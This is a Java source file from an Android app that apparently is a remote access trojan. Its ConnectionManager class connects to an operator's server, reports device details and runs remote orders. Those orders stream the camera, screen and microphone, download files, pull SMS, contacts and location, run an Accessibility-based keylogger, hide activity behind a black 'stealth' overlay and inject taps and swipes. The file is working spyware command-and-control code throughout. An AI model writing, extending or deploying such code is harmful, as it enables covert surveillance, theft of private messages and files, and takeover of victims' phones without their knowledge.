package com.Deviant.pro;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;

public class ConnectionManager {

    private static final String TAG = "ConnectionManager";

    public static String HOST = "0.0.0.0"; // Replace with your server IP
    public static int    PORT = 7777;       // Replace with your server port

    private static final AtomicBoolean isRunning = new AtomicBoolean(false);

    private static Socket       socket;
    private static PrintWriter  out;
    private static BufferedReader in;

    private static final LinkedBlockingQueue<String> sendQueue =
            new LinkedBlockingQueue<>();

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    public static void startAsync(final Context context) {
        // compareAndSet: only start once even if called from multiple threads
        if (!isRunning.compareAndSet(false, true)) return;

        // Sender thread — drains the queue and writes to the socket
        Thread senderThread = new Thread(() -> {
            while (true) {
                String data = null;
                try {
                    data = sendQueue.take(); // blocks until data available
                    synchronized (ConnectionManager.class) {
                        if (out != null) {
                            out.println(data);
                            out.flush();
                            if (out.checkError()) {
                                Log.e(TAG, "Write failed — connection broken");
                                // Re-queue so data isn't lost on reconnect
                                sendQueue.offer(data);
                            }
                        } else {
                            // Not connected yet — put data back
                            sendQueue.offer(data);
                        }
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    Log.w(TAG, "Sender thread interrupted");
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Sender thread error: " + e.getMessage());
                    if (data != null) sendQueue.offer(data);
                }
            }
        });
        senderThread.setName("cm-sender");
        senderThread.setDaemon(true);
        senderThread.start();

        // Receiver / connect thread
        Thread connectThread = new Thread(() -> connect(context));
        connectThread.setName("cm-connect");
        connectThread.setDaemon(true);
        connectThread.start();
    }

    /** Enqueue a message for sending. Safe to call from any thread. */
    public static void send(String data) {
        if (data != null) sendQueue.offer(data);
    }

    // -------------------------------------------------------------------------
    // Connection loop
    // -------------------------------------------------------------------------

    private static void connect(Context context) {
        while (true) {
            try {
                Log.d(TAG, "Connecting to " + HOST + ":" + PORT);

                Socket newSocket = new Socket(HOST, PORT);
                newSocket.setTcpNoDelay(true);

                // All stream assignments inside sync to avoid partial visibility
                synchronized (ConnectionManager.class) {
                    socket = newSocket;
                    out = new PrintWriter(
                            new OutputStreamWriter(socket.getOutputStream(),
                                    StandardCharsets.UTF_8), true);
                    in  = new BufferedReader(
                            new InputStreamReader(socket.getInputStream(),
                                    StandardCharsets.UTF_8));
                }

                Log.d(TAG, "Connected to " + HOST + ":" + PORT);
                sendInitialData(context);

                // Read loop — blocks until connection drops or server closes
                String line;
                while ((line = in.readLine()) != null) {
                    handleCommand(context, line);
                }

            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                stopManagers();
            } finally {
                cleanup();
            }

            // Wait before reconnecting
            try { Thread.sleep(5000); } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
        }
    }

    // -------------------------------------------------------------------------
    // Cleanup
    // -------------------------------------------------------------------------

    private static void cleanup() {
        synchronized (ConnectionManager.class) {
            try { if (out    != null) out.close();    } catch (Exception ignored) {}
            try { if (in     != null) in.close();     } catch (Exception ignored) {}
            try { if (socket != null) socket.close(); } catch (Exception ignored) {}
            out    = null;
            in     = null;
            socket = null;
        }
    }

    private static void stopManagers() {
        try { CameraManager.stopStreaming();  } catch (Exception e) { Log.e(TAG, "CameraManager stop error", e); }
        try { ScreenManager.stopStreaming();  } catch (Exception e) { Log.e(TAG, "ScreenManager stop error", e); }
        try {
            KeylogManager km = KeylogManager.getInstance();
            if (km != null) km.stopScreenReader();
        } catch (Exception e) { Log.e(TAG, "KeylogManager stop error", e); }
    }

    // -------------------------------------------------------------------------
    // Handshake
    // -------------------------------------------------------------------------

    private static void sendInitialData(Context context) throws Exception {
        JSONObject jo = new JSONObject();
        jo.put("type",    "login");
        jo.put("model",   Build.MODEL);
        jo.put("man",     Build.MANUFACTURER);
        jo.put("release", Build.VERSION.RELEASE);
        send(jo.toString());
    }

    // -------------------------------------------------------------------------
    // Command dispatcher
    // -------------------------------------------------------------------------

    private static void handleCommand(Context context, String data) {
        try {
            JSONObject jo    = new JSONObject(data);
            String     order = jo.getString("order");
            Log.d(TAG, "Received order: " + order);

            switch (order) {

                case "camera":
                    CameraManager.startStreaming(context, jo);
                    break;

                case "stop_camera":
                    CameraManager.stopStreaming();
                    break;

                case "file_manager":
                    FileManager.walk(jo.getString("path"));
                    break;

                case "file_download":
                    FileManager.download(jo.getString("path"));
                    break;

                case "sms":
                    SMSManager.getSMSList(context);
                    break;

                case "contacts":
                    ContactsManager.getContacts(context);
                    break;

                case "mic":
                    MicManager.handle(jo);
                    break;

                case "location":
                    LocManager.getLocation(context);
                    break;

                case "device_info":
                    DeviceInfoManager.getInfo(context);
                    break;

                case "screen_reader": {
                    KeylogManager km = KeylogManager.getInstance();
                    if (km != null) {
                        if ("start".equals(jo.optString("action"))) {
                            km.startScreenReader();
                        } else {
                            km.stopScreenReader();
                        }
                    }
                    break;
                }

                case "screen_share": {
                    if ("start".equals(jo.optString("action"))) {
                        MainActivity main = MainActivity.getInstance();
                        if (main != null) main.requestScreenShare();
                    } else {
                        ScreenManager.stopStreaming();
                    }
                    break;
                }

                case "automation": {
                    KeylogManager km = KeylogManager.getInstance();
                    if (km != null) {
                        // Use optString so missing keys don't throw JSONException
                        km.processCommand(
                                jo.optString("command",  ""),
                                jo.optString("argument", null));
                    }
                    break;
                }

                case "stealth": {
                    KeylogManager km = KeylogManager.getInstance();
                    if (km != null) km.toggleBlackOverlay(jo.getBoolean("enable"));
                    break;
                }

                case "gesture": {
                    KeylogManager km = KeylogManager.getInstance();
                    if (km == null) {
                        Log.w(TAG, "Gesture received but Accessibility is NOT active!");
                        break;
                    }
                    String type = jo.getString("type");
                    switch (type) {
                        case "click":
                            km.click(jo.getInt("x"), jo.getInt("y"));
                            break;
                        case "swipe":
                            km.swipe(
                                    jo.getInt("x1"), jo.getInt("y1"),
                                    jo.getInt("x2"), jo.getInt("y2"),
                                    jo.getInt("duration"));
                            break;
                        case "action":
                            km.performAction(jo.getInt("actionId"));
                            break;
                        default:
                            Log.w(TAG, "Unknown gesture type: " + type);
                            break;
                    }
                    break;
                }

                default:
                    Log.w(TAG, "Unknown order: " + order);
                    break;
            }

        } catch (Exception e) {
            Log.e(TAG, "Command handling error: " + e.getMessage(), e);
        }
    }
}
